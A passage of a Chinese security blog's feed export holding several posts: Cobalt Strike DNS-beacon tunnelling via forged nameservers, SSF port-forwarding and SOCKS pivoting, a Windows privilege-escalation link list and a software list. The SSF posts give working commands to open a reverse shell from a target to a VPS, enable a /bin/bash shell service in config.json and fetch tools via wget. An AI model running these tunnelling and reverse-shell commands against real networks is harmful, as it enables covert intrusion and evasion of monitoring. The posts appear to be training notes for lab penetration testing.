href="http://www.attack.com/">www.attack.com</a></p><p>打个比方：IP就是身份证号，域名就是名字</p><p>创建A记录的过程，就好比办身份证的时候，<strong><strong>将名字和身份证号绑定</strong></strong>的过程，于是有关部门就能够通过身份证查询到姓名。</p><p>创建NS记录，就是<strong>将身份信息录入全国联网数据库</strong>的过程。如果没有NS记录，那么即使有你的名字和身份证号，那么该如何找到你呢？所以要通过NS记录，指定一个可以提供查询服务的域名服务器。</p><p>根服务器主要用来管理互联网的主目录，最早是IPV4，全球只有13台。所以域名服务器根本无法保存世界上所有的域名和IP的记录。这是通过dns递归查询来办到的。</p><p>dns递归查询是指有一个域名1234.profiles.losenolove.com<br>本地dns服务器会首先向根域名服务器root server查询，root server会返回，我不知道，你去问.com服务器</p><p>管理.com域名的dns服务器会返回，我不知道，你去问管理losenolove.com域名的dns服务器</p><p>管理losenolove.com域名的dns服务器：我不知道，你去问管理profiles.losenolove.com的dns服务器</p><p>管理profiles.losenolove.com的dns服务器：域名1234.profiles.losenolove.com的ip是xxx<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/dnscomms2.png"></p><h2 id="windows配置dns服务器"><a href="#windows配置dns服务器" class="headerlink" title="windows配置dns服务器"></a>windows配置dns服务器</h2><p>如何配置一个dns服务器，来进行域名解析。在真实渗透的时候，域名提供商会在前端页面提供域名配置的地方。在这里我们可以在本地配置dns服务器，可以更清楚地了解dns服务器对域名解析的过程。</p><h3 id="创建一个正向区域"><a href="#创建一个正向区域" class="headerlink" title="创建一个正向区域"></a>创建一个正向区域</h3><p>正向查找就是域名解析为IP，反向查找就是IP解析为域名<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image2.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image3.png"></p><h3 id="新建域名"><a href="#新建域名" class="headerlink" title="新建域名"></a>新建域名</h3><p>设置区域名称，俗称域名<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image4.png"></p><h3 id="添加A记录"><a href="#添加A记录" class="headerlink" title="添加A记录"></a>添加A记录</h3><p>将域名和teamserver的IP进行绑定<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image5.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image6.png"></p><h3 id="新建委派"><a href="#新建委派" class="headerlink" title="新建委派"></a>新建委派</h3><p>到sangforsec.com的区域中再新建一个子域，然后在子域新建一条委派，将委派到前面创建的A记录上，解析过程,dns隧道工具在访问 dnstunnel.dnssec.sangforsec.com这个域时,大致的迭代过程是这样的,它会先找到 sangforsec.com这个域,然后在这个域下,它找到了 dnssec 的这个子域,然后又在子域中发现dnstunnel.dnssec.sangforsec.com原来是一条被委派的 ns 记录,最后请求就会被交给这条 ns 记录对应的 A 记录即 ip 去处理。</p><p>A记录指向DNS服务器IP&gt;NS记录指向A记录域名<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image7.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image8.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image9.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image6.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image11.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image10.png"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image10.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image11.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image12.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image13.png"><br>DNS服务器尝试使用nslookup解析ns记录，可以正常解析到A记录的主机IP<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image14.png"><br>上面步骤搞定后，在内网主机和公网DNS隧道服务器端配置DNS为10.100.18.30，并进行解析测试</p><p>公网区域入侵者DNS隧道服务器端-KaliMaster<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image15.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image16.png"><br>内网受控主机Sangfor-4<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image17.png"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/image18.png"></p><h2 id="最后使用"><a href="#最后使用" class="headerlink" title="最后使用"></a>最后使用</h2><p>checkin<br>mode dns-txt与靶机进行session交互</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/1.png"><br>设置ns记录（<a href="http://www.attackcat.com/">www.attackcat.com</a> – 10.246.95.135）意思是名称服务器的ip是10.246.95.135，指定这个名称服务器进行域名解析。这个名称服务器是攻击者伪造的。受害者会向伪造的名称服务器发送域名解析请求，伪造名称服务器会将tun.attackcat.com这个域名解析为teamserver的ip。这个ns记录可以有多条，也就是说，可以有多个名称服务器来进行解析。</p><p>设置a记录 （tun.attackcat.com  – 10.246.95.135）</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/2.png"><br>使用<code>nslookup www.attackcat.com</code>查看结果0.0.0.0，说明伪造的名称服务器成功了。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-11/3.png"><br>如果使用<code>nslookup www.attackcatt.com</code>，结果会提示dns请求超时。</p><h3 id="ns记录和a记录在dns协议中起到什么样的作用"><a href="#ns记录和a记录在dns协议中起到什么样的作用" class="headerlink" title="ns记录和a记录在dns协议中起到什么样的作用"></a>ns记录和a记录在dns协议中起到什么样的作用</h3><p>如果dns服务器只设置了A记录，那么ping tun.attackcat.com可以找到teamserver的IP。但是要通过dns协议来进行通信，回顾一下原理。目标主机访问——内部dns服务器——内部dns服务器往root dns server请求——root dns server向下进行域名解析——伪造的name server解析域名到teamserver的IP</p><p>所以虽然内部主机可以ping通teamserver，但是不能直接与teamserver通信。要通过dns协议，让许多dns服务器来进行域名解析的方式，作为代理传递数据包。所以dns隧道速度会相比于其他协议http、https的隧道慢很多。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/bluestorm/p/10345334.html">https://www.cnblogs.com/bluestorm/p/10345334.html</a></li><li><a href="https://www.cobaltstrike.com/help-dns-beacon">https://www.cobaltstrike.com/help-dns-beacon</a></li><li><a href="https://www.ershicimi.com/p/5817d5d237e6bafd8ed013587403a38a">工具的使用 | CobaltStrike中DNS Beacon的使用</a></li><li><a href="https://www.anquanke.com/post/id/210848">内网流量规避</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%90%8D%E7%A7%B0%E6%9C%8D%E5%8A%A1%E5%99%A8">名称服务器</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>cobaltstrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cobaltstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssf反向动态转发与正向的区别&amp;反弹shell</title>
    <link href="/2021/01/31/10-x/"/>
    <url>/2021/01/31/10-x/</url>
    
    <content type="html"><![CDATA[<h2 id="正向动态转发（要访问的是ssfd服务端的网络）"><a href="#正向动态转发（要访问的是ssfd服务端的网络）" class="headerlink" title="正向动态转发（要访问的是ssfd服务端的网络）"></a>正向动态转发（要访问的是ssfd服务端的网络）</h2><p>当我们要去连接内网的时候，可以直接访问到</p><p>ssf服务端设置（访问这个网络）</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">./ssfd</span> <span class="hljs-string">-p</span> <span class="hljs-number">1080</span><br><span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">SimpleHTTPServer</span> <span class="hljs-number">8000</span><br><span class="hljs-string">wget</span> <span class="hljs-string">-r</span> <span class="hljs-string">http://192.168.28.148:8000/ssf</span><br><br><span class="hljs-string">ssf客户端设置：</span><br><span class="hljs-string">./ssf</span> <span class="hljs-string">-D</span> <span class="hljs-number">1089</span> <span class="hljs-string">-p</span> <span class="hljs-number">8080 </span><span class="hljs-string">VPS-IP</span><br></code></pre></div></td></tr></table></figure><h2 id="反向动态转发（要访问的是ssf客户端的网络）"><a href="#反向动态转发（要访问的是ssf客户端的网络）" class="headerlink" title="反向动态转发（要访问的是ssf客户端的网络）"></a>反向动态转发（要访问的是ssf客户端的网络）</h2><p>当我们要连接内网，但是无法直接访问内网机器。如果内网机器可以出网，那么就可以让内网机器来连我们。</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">vps上设置监听：</span><br><span class="hljs-string">./ssfd</span> <span class="hljs-string">-p</span> <span class="hljs-number">8080</span><br><br><span class="hljs-string">内网机器来主动连接我们：</span><br><span class="hljs-string">./ssf</span> <span class="hljs-string">-F</span> <span class="hljs-number">1089</span> <span class="hljs-string">-p</span> <span class="hljs-number">8080 </span><span class="hljs-string">VPS-IP</span><br><span class="hljs-string">./ssf</span> <span class="hljs-string">-F</span> <span class="hljs-number">1089</span> <span class="hljs-string">-p</span> <span class="hljs-number">8080 </span><span class="hljs-number">18.167</span><span class="hljs-number">.19</span><span class="hljs-number">.3</span><br></code></pre></div></td></tr></table></figure><h2 id="案例一：访问谷歌"><a href="#案例一：访问谷歌" class="headerlink" title="案例一：访问谷歌"></a>案例一：访问谷歌</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">vps设置：./ssfd</span> <span class="hljs-string">-p</span> <span class="hljs-number">8080</span><br><span class="hljs-string">攻击机器设置：./exim</span> <span class="hljs-string">-D</span> <span class="hljs-number">1089</span> <span class="hljs-string">-p</span> <span class="hljs-number">1080 </span><span class="hljs-number">18.167</span><span class="hljs-number">.19</span><span class="hljs-number">.3</span><br><span class="hljs-string">proxychains</span> <span class="hljs-string">firefox</span> <br><span class="hljs-string">./ssf</span> <span class="hljs-string">-D</span> <span class="hljs-number">1089</span> <span class="hljs-string">-p</span> <span class="hljs-number">8080 </span><span class="hljs-number">18.167</span><span class="hljs-number">.19</span><span class="hljs-number">.3</span><br></code></pre></div></td></tr></table></figure><h2 id="案例二：弹shell"><a href="#案例二：弹shell" class="headerlink" title="案例二：弹shell"></a>案例二：弹shell</h2><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">【vps设置】<br>./ssfd -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8080</span> -c config<span class="hljs-selector-class">.json</span> /<span class="hljs-selector-tag">b</span><br><br>【目标机器】<br>./ssf -Y shell要接收的端口 VPS -c config<span class="hljs-selector-class">.json</span> -<span class="hljs-selector-tag">p</span> VPS监听的端口<br><br>./ssf -Y <span class="hljs-number">8888</span> <span class="hljs-number">45.62</span>.<span class="hljs-number">123.226</span> -c config<span class="hljs-selector-class">.json</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8080</span><br></code></pre></div></td></tr></table></figure><p>nc 127.0.0.1 8888</p><h3 id="config-json参考配置"><a href="#config-json参考配置" class="headerlink" title="config.json参考配置"></a>config.json参考配置</h3><figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;ssf&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;arguments&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-attr">&quot;circuit&quot;</span>: [],<br>    <span class="hljs-attr">&quot;tls&quot;</span> : &#123;<br>      <span class="hljs-attr">&quot;ca_cert_path&quot;</span>: <span class="hljs-string">&quot;./certs/trusted/ca.crt&quot;</span>,<br>      <span class="hljs-attr">&quot;cert_path&quot;</span>: <span class="hljs-string">&quot;./certs/certificate.crt&quot;</span>,<br>      <span class="hljs-attr">&quot;key_path&quot;</span>: <span class="hljs-string">&quot;./certs/private.key&quot;</span>,<br>      <span class="hljs-attr">&quot;key_password&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;dh_path&quot;</span>: <span class="hljs-string">&quot;./certs/dh4096.pem&quot;</span>,<br>      <span class="hljs-attr">&quot;cipher_alg&quot;</span>: <span class="hljs-string">&quot;DHE-RSA-AES256-GCM-SHA384&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;http_proxy&quot;</span> : &#123;<br>      <span class="hljs-attr">&quot;host&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;user_agent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;credentials&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;username&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-attr">&quot;password&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-attr">&quot;domain&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-attr">&quot;reuse_ntlm&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br>        <span class="hljs-attr">&quot;reuse_nego&quot;</span>: <span class="hljs-string">&quot;true&quot;</span><br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;services&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;datagram_forwarder&quot;</span>: &#123; <span class="hljs-attr">&quot;enable&quot;</span>: <span class="hljs-literal">true</span> &#125;,<br>      <span class="hljs-attr">&quot;datagram_listener&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;enable&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-attr">&quot;shell&quot;</span>: &#123; <span class="hljs-attr">&quot;enable&quot;</span>: <span class="hljs-literal">false</span> &#125;,<br>        <span class="hljs-attr">&quot;gateway_ports&quot;</span>: <span class="hljs-literal">false</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;stream_forwarder&quot;</span>: &#123; <span class="hljs-attr">&quot;enable&quot;</span>: <span class="hljs-literal">true</span> &#125;,<br>      <span class="hljs-attr">&quot;stream_listener&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;enable&quot;</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">&quot;gateway_ports&quot;</span>: <span class="hljs-literal">false</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;copy&quot;</span>: &#123; <span class="hljs-attr">&quot;enable&quot;</span>: <span class="hljs-literal">false</span> &#125;,<br>      <span class="hljs-attr">&quot;shell&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;enable&quot;</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>        <span class="hljs-attr">&quot;args&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;socks&quot;</span>: &#123; <span class="hljs-attr">&quot;enable&quot;</span>: <span class="hljs-literal">true</span> &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows提权导航页</title>
    <link href="/2021/01/04/10-x/"/>
    <url>/2021/01/04/10-x/</url>
    
    <content type="html"><![CDATA[<h2 id="windows内核漏洞"><a href="#windows内核漏洞" class="headerlink" title="windows内核漏洞"></a>windows内核漏洞</h2><p><a href="https://www.bilibili.com/video/av88180824/">windows内核漏洞提权教程</a></p><h2 id="windows服务"><a href="#windows服务" class="headerlink" title="windows服务"></a>windows服务</h2><ol><li><a href="https://www.acfun.cn/v/ac12864807">DLLHijack</a></li><li><a href="https://www.bilibili.com/video/BV147411g77n">无引号服务路径提权</a></li><li><a href="https://www.bilibili.com/video/BV1M741177De">windows本地提权之命名管道</a></li><li><a href="https://www.bilibili.com/video/BV1h7411n79h">服务提权之注册表提权</a></li><li><a href="https://www.bilibili.com/video/BV1i7411E7J3">windows服务漏洞之可执行文件</a></li><li><a href="https://www.bilibili.com/video/BV1J7411g7g3">windows服务漏洞之binpath提权</a></li></ol><h2 id="密码挖掘提权（跳过）"><a href="#密码挖掘提权（跳过）" class="headerlink" title="密码挖掘提权（跳过）"></a>密码挖掘提权（跳过）</h2><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><ol><li><a href="https://www.bilibili.com/video/BV1L7411J7jP">autorun</a></li><li><a href="https://www.bilibili.com/video/BV1U741177YG">总是以管理员权限安装的提权</a></li></ol><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p><a href="https://www.bilibili.com/video/BV1K7411A7xk">计划任务的提权</a></p><h2 id="UAC-bypass"><a href="#UAC-bypass" class="headerlink" title="UAC bypass"></a>UAC bypass</h2><p>待更新</p><h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><p><a href="https://www.bilibili.com/video/av91087772">HotPotato提权</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</a></p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一期纯粹的软件推荐文章</title>
    <link href="/2021/01/03/09-x/"/>
    <url>/2021/01/03/09-x/</url>
    
    <content type="html"><![CDATA[<h1 id="文件相关"><a href="#文件相关" class="headerlink" title="文件相关"></a>文件相关</h1><h2 id="文本编辑"><a href="#文本编辑" class="headerlink" title="文本编辑"></a>文本编辑</h2><ul><li><p><a href="https://notepad-plus-plus.org/downloads/">https://notepad-plus-plus.org/downloads/</a></p><h2 id="markdown文档编辑器"><a href="#markdown文档编辑器" class="headerlink" title="markdown文档编辑器"></a>markdown文档编辑器</h2></li><li><p><a href="https://hemashushu.github.io/yu-writer.site/">https://hemashushu.github.io/yu-writer.site/</a><br>优点是界面设计优秀，好看好用</p></li><li><p><a href="https://typora.io/">https://typora.io/</a></p></li><li><p><a href="https://github.com/jgm/pandoc">https://github.com/jgm/pandoc</a><br>优点是插件多：支持markdown转docx格式</p></li></ul><h2 id="多人协同在线文档编辑"><a href="#多人协同在线文档编辑" class="headerlink" title="多人协同在线文档编辑"></a>多人协同在线文档编辑</h2><p>石墨文档</p><ul><li><a href="https://shimo.im/desktop">https://shimo.im/desktop</a></li></ul><h2 id="在线拓扑图"><a href="#在线拓扑图" class="headerlink" title="在线拓扑图"></a>在线拓扑图</h2><ul><li><a href="https://www.processon.com/">https://www.processon.com/</a></li></ul><h2 id="pdf阅读器"><a href="#pdf阅读器" class="headerlink" title="pdf阅读器"></a>pdf阅读器</h2><ul><li><a href="https://get.adobe.com/cn/reader/">https://get.adobe.com/cn/reader/</a></li></ul><h2 id="多电脑文件同步软件"><a href="#多电脑文件同步软件" class="headerlink" title="多电脑文件同步软件"></a>多电脑文件同步软件</h2><p>国内可以用：</p><ul><li><a href="http://www.verysync.com/">http://www.verysync.com/</a></li></ul><p>国外可以用：Resilio Sync</p><h2 id="快速文件搜索"><a href="#快速文件搜索" class="headerlink" title="快速文件搜索"></a>快速文件搜索</h2><ul><li><p><a href="https://www.voidtools.com/zh-cn/">https://www.voidtools.com/zh-cn/</a></p></li><li><p><a href="https://github.com/Wox-launcher/Wox">https://github.com/Wox-launcher/Wox</a></p></li></ul><h2 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h2><ul><li><a href="https://daumpotplayer.com/download/">https://daumpotplayer.com/download/</a></li></ul><h1 id="上传下载"><a href="#上传下载" class="headerlink" title="上传下载"></a>上传下载</h1><h2 id="给别人发大文件快传"><a href="#给别人发大文件快传" class="headerlink" title="给别人发大文件快传"></a>给别人发大文件快传</h2><p><a href="https://cowtransfer.com/">https://cowtransfer.com/</a></p><h2 id="多线程文件下载器"><a href="#多线程文件下载器" class="headerlink" title="多线程文件下载器"></a>多线程文件下载器</h2><ul><li><a href="https://www.freedownloadmanager.org/zh/">https://www.freedownloadmanager.org/zh/</a></li></ul><h2 id="祝百度早日倒闭"><a href="#祝百度早日倒闭" class="headerlink" title="祝百度早日倒闭"></a>祝百度早日倒闭</h2><ul><li><a href="http://www.speedpan.net/">http://www.speedpan.net/</a></li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="开源密码管理软件"><a href="#开源密码管理软件" class="headerlink" title="开源密码管理软件"></a>开源密码管理软件</h2><ul><li><a href="https://keepass.info/">https://keepass.info/</a></li></ul><h2 id="录屏软件"><a href="#录屏软件" class="headerlink" title="录屏软件"></a>录屏软件</h2><p><a href="https://mathewsachin.github.io/Captura/">https://mathewsachin.github.io/Captura/</a></p><h2 id="翻墙软件"><a href="#翻墙软件" class="headerlink" title="翻墙软件"></a>翻墙软件</h2><p><a href="https://www.v2ray.com/">https://www.v2ray.com/</a></p><h2 id="虚拟机管理"><a href="#虚拟机管理" class="headerlink" title="虚拟机管理"></a>虚拟机管理</h2><ul><li><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html</a></li></ul><h2 id="windows平台ssh客户端"><a href="#windows平台ssh客户端" class="headerlink" title="windows平台ssh客户端"></a>windows平台ssh客户端</h2><p><a href="https://mobaxterm.mobatek.net/">https://mobaxterm.mobatek.net/</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssf隧道</title>
    <link href="/2021/01/03/11-ssf%E9%9A%A7%E9%81%93/"/>
    <url>/2021/01/03/11-ssf%E9%9A%A7%E9%81%93/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>当你凝视深渊的时候，深渊也在凝视着你。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03-11/tuopu.png" alt="tuopu"></p><h2 id="ssf隧道"><a href="#ssf隧道" class="headerlink" title="ssf隧道"></a>ssf隧道</h2><p>录制的视频：</p><ul><li><p><a href="https://www.bilibili.com/video/BV1zy4y1e7ym"> SSF反向端口转发&amp;动态转发</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1ja4y1n7fV">多层内网隧道-SSF正向端口转发</a></p></li></ul><h3 id="socket-套接字是什么"><a href="#socket-套接字是什么" class="headerlink" title="socket 套接字是什么"></a>socket 套接字是什么</h3><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03-11/12.png" alt="12"></p><h3 id="带着问题去思考，何为正向，何为反向"><a href="#带着问题去思考，何为正向，何为反向" class="headerlink" title="带着问题去思考，何为正向，何为反向"></a>带着问题去思考，何为正向，何为反向</h3><h3 id="正向端口转发"><a href="#正向端口转发" class="headerlink" title="正向端口转发"></a>正向端口转发</h3><p>步骤一：</p><p>服务端执行：</p><p><code>upx-ssfd.exe -p 1080</code></p><p>服务端开启1080端口，进行监听</p><p>客户端执行：</p><p><code>ssf -D 9000 -p 1080 172.20.122.149（这个ip是服务端的ip）</code></p><p>连接服务端172.20.122.149的1080端口，使用本地9000进行动态端口转发。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03-11/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-03-11/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><h3 id="反向端口转发"><a href="#反向端口转发" class="headerlink" title="反向端口转发"></a>反向端口转发</h3><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">./upx-ssfd -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1080</span><br><br>ssf<span class="hljs-selector-class">.exe</span> -R 转发到远程开放的端口:要连接的目标IP:要连接的目标IP的端口 -<span class="hljs-selector-tag">p</span> ssf服务器开放的端口 ssf服务器IP<br><br>ssf<span class="hljs-selector-class">.exe</span> -R <span class="hljs-number">1081</span>:<span class="hljs-number">192.168</span>.<span class="hljs-number">6.78</span>:<span class="hljs-number">3389</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1080</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">5.8</span> /b<br></code></pre></div></td></tr></table></figure><h3 id="正向SOCKS代理"><a href="#正向SOCKS代理" class="headerlink" title="正向SOCKS代理"></a>正向SOCKS代理</h3><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">正向动态端口转发<br>【内网机器执行服务端，保持监听】<br>upx-ssfd<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> 本地ssf服务器开放的端口<br>upx-ssfd<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1080</span><br><br><br>【外部机器连接内网机器的ip，正向连接】<br>./upx-ssf -D 本地要开放的端口 -<span class="hljs-selector-tag">p</span> ssf服务器的端口 ssf服务器IP <br>./upx-ssf -D <span class="hljs-number">1081</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1080</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">142.133</span><br><br>【外部机器】<br>proxychains配置<br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1081</span> <br></code></pre></div></td></tr></table></figure><h3 id="反向SOCKS代理"><a href="#反向SOCKS代理" class="headerlink" title="反向SOCKS代理"></a>反向SOCKS代理</h3><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">反向动态端口转发<br>【外网机器执行服务端，保持监听】<br>upx-ssfd<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> ssf服务器开放的端口<br>upx-ssfd<span class="hljs-selector-class">.exe</span> 